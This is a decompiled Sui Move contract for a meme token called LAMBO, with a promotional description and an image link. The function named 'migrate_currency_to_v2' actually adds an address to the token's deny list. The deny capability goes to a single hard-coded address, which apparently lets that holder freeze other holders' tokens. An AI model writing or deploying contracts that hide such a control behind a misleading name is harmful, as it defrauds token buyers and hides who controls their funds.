module 0xd4dc2dd8a5e0e99b069dcc093de823ca8e7dd36cb13074285bc95dbd0c5f4a99::lambo {
    struct LAMBO has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<LAMBO>, arg1: 0x2::coin::Coin<LAMBO>) {
        0x2::coin::burn<LAMBO>(arg0, arg1);
    }

    fun init(arg0: LAMBO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LAMBO>(arg0, 9, b"LAMBO", b"LAMBO", b"I started as a happy little hamster -- Trading wasn't better, every x100 long on BTC or #SUI ended in liquidation. Watching whales win while I kept losing, I decided to uncover their secrets. Want to see what I've learned? Follow me and join the adventure", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.ibb.co/mF4QBKp/AVA.jpg")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<LAMBO>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LAMBO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<LAMBO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LAMBO>>(v1, @0x531ba5434f231b21e8accdf738b4c2b2f63136d50668c3ecca938a1b971e661d);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LAMBO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LAMBO>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<LAMBO>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<LAMBO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

